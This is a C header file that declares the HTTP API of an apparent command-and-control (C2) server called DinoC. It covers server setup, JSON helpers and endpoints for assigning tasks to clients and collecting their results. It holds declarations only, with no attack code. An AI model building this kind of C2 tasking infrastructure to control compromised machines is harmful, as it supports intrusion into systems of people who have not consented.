/**
 * @file api.h
 * @brief API interface for C2 server
 */

#ifndef DINOC_API_H
#define DINOC_API_H

#include "common.h"
#include <microhttpd.h>
#include <jansson.h>

// API handler function type
typedef status_t (*api_handler_func_t)(struct MHD_Connection* connection,
                                     const char* url, const char* method,
                                     const char* upload_data, size_t upload_data_size);

// API handler structure
typedef struct {
    char* url;
    char* method;
    api_handler_func_t handler;
} api_handler_t;

// HTTP server functions
status_t http_server_init(const char* bind_address, uint16_t port);
status_t http_server_start(void);
status_t http_server_stop(void);
status_t http_server_shutdown(void);

status_t http_server_register_handler(const char* url, const char* method, api_handler_func_t handler);

status_t http_server_send_response(struct MHD_Connection* connection, int status_code,
                                 const char* content_type, const char* response);
status_t http_server_send_json_response(struct MHD_Connection* connection, int status_code, json_t* json);
status_t http_server_parse_json_request(const char* upload_data, size_t upload_data_size, json_t** json);
status_t http_server_extract_uuid_from_url(const char* url, const char* prefix, uuid_t* uuid);

// Task API handlers
status_t register_task_api_handlers(void);

status_t api_tasks_get(struct MHD_Connection* connection,
                     const char* url, const char* method,
                     const char* upload_data, size_t upload_data_size);
status_t api_tasks_post(struct MHD_Connection* connection,
                      const char* url, const char* method,
                      const char* upload_data, size_t upload_data_size);
status_t api_task_get(struct MHD_Connection* connection,
                    const char* url, const char* method,
                    const char* upload_data, size_t upload_data_size);
status_t api_task_state_put(struct MHD_Connection* connection,
                          const char* url, const char* method,
                          const char* upload_data, size_t upload_data_size);
status_t api_task_result_post(struct MHD_Connection* connection,
                            const char* url, const char* method,
                            const char* upload_data, size_t upload_data_size);
status_t api_client_tasks_get(struct MHD_Connection* connection,
                            const char* url, const char* method,
                            const char* upload_data, size_t upload_data_size);

#endif /* DINOC_API_H */
